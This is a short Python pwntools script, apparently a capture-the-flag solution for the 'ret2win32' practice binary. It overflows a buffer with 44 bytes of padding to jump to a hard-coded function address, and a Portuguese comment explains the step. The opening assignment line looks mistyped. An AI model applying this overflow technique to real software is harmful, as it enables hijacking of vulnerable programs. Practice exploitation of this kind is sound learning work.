#!/usr/bin/env python3

from pwn import *

elf = elf.context = ELF('ret2win32')
p = process(elf.path)

### EXPLAINED ###
'''
Estouramos o buffer e  chamamos a ret2win
'''

ret2win = 0x804862c

xpl = b''
xpl += b'A' * 44
xpl += p32(ret2win)

p.sendline(xpl)
p.interactive()
